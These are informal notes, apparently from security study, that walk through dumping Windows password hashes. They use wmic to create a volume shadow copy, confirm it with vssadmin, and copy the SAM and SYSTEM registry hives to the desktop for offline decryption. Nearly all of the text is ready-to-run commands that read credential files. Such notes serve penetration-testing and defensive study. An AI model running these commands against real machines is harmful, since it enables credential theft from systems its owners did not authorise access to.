So, this is when we use a built in tool from windows called 
volume copy shadow service within a COMMAND PROMPT to attempt to copy
the SAM hashes.

We need a COMMAND PROMPT With ADMINISTRATOR PRIV to do this

Run the standard cmd.exe prompt with administrator privileges.
Execute the wmic command to create a copy shadow of C: drive
Verify the creation from step 2 is available.
Copy the SAM database from the volume we created in step 2

wmic shadowcopy call create Volume='C:\'

after we create it, we can use vssadmin to list and confirm that we have
a copy of the C drive.

vssadmin list shadows

itll show the successful thing if it was successful, and then itll output
wherever its stored within this line:
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

SAM database is usually encrypted with RC4 or AES encryption, so we need
a key to decrpyt it. the key is stored in the files system in:
c:\Windows\System32\Config\system

now, we copy both the SAM and the SYSTEM files from the shadowcopy
we generateed so we can grab this database (copied to desktop):
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
